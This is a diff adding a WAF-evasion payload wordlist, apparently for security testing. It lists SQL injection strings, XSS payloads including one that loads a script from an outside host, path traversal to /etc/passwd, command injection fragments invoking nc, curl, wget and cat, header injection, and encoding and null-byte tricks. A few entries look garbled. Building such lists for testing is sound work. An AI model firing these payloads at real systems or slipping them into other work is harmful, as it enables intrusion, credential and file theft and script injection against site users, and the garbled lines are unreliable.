@@ -1,0 +1,173 @@
+# WAF Bypass Patterns and Techniques
+# Format: One bypass pattern per line
+# Used for testing WAF detection evasion
+
+# SQL Injection Bypass
+"OR 1=1"
+"OR '1'='1'"
+"OR 1=1--"
+"OR 1=1#"
+"OR 1=1/*"
+"OR 1=1-- -"
+"OR '1'='1' --"
+"OR 1=1;--"
+"OR 1=1; #"
+UNION SELECT NULL
+UNION ALL SELECT
+UNION SELECT 1,2,3
+1' AND '1'='1
+' OR '1'='1' --
+" OR "1"="1
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or 1=1--
+'-'
+'&'
+'^'
+'*'
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+'" or "1"="1
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+
+# XSS Bypass
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+javascript:alert(1)
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe src="javascript:alert(1)">
+<script/src=//xs.la/xss.js>
+<ScRiPt>alert(1)</sCrIpT>
+<SVG ONLOAD=alert(1)>
+<script>alert(1)</script>
+<img src="x" onerror="alert(1)">
+<svg><script>alert(1)</script></svg>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<iframe srcdoc=<script>alert(1)</script>>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+
+# Path Traversal Bypass
+../../
+....//
+..//
+%2e%2e%2f
+%2e%2e/
+%2e%2e%5c
+..%5c
+%252e%252e%252f
+%252e%252e/
+..%252f
+..%2F
+....%5c
+..../
+..;/../
+..;/
+././../
+/etc/passwd
+/etc/passwd%00
+/etc/passwd%00.jpg
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+
+# Command Injection Bypass
+; ls
+;ls
+| ls
+|| ls
+&& ls
+& ls
+& & ls
+`ls`
+$(ls)
+${ls}
+|nc
+; ping -c 1
+; curl
+; wget
+; cat /etc/passwd
+;e ls
+;i nv /etc/passwd
+\n cat /etc/passwd
+%0a cat /etc/passwd
+%0d cat /etc/passwd
+%0a%0d cat /etc/passwd
+
+# Header Injection Bypass
+%0d%0a
+%0a%0d
+\r\n
+\n\r
+%0a
+%0d
+%20
+%09
+%0aSet-Cookie:%20foo=bar
+
+# Encoding Bypass
+%20
+%09
+%0a
+%0d
+%00
+%ff
+%2500
+%%32
+%%2e
+%%2f
+%%3d
+%u0020
+%u0009
+%u000a
+%u000d
+
+# Case Variation Bypass
+<ScRiPt>alert(1)</sCrIpT>
+<SVG ONLOAD=alert(1)>
+<Script>alert(1)</script>
+<IMG SRC=x ONERROR=alert(1)>
+<Body OnLoad=alert(1)>
+<iMg srC=x oNeRrOr=alert(1)>
+
+# Comment-Based Bypass
+<script>/*alert(1)*/</script>
+<script>alert(1)//</script>
+<script>alert(1)/*...*/</script>
+<!--><script>alert(1)</script-->
+<script>alert(1)<!--</script>
+<script>alert/**/(1)</script>
+<style>/*<script>alert(1)//</style>
+
+# Null Byte Bypass
+%00
+\0
+\x00
+%2500
+0x00
+\00
+%00.html
+%00.jsp
+%00.php
+
+# Protocol Bypass
+javascript:alert(1)
+JAVASCRIPT:alert(1)
+JaVaScRiPt:alert(1)
+data:text/html,<script>alert(1)</script>
+data:,alert(1)
+<vbscript:msgbox(1)>
+<xml id="x"><x xmlns:a="&{alert(1)}">
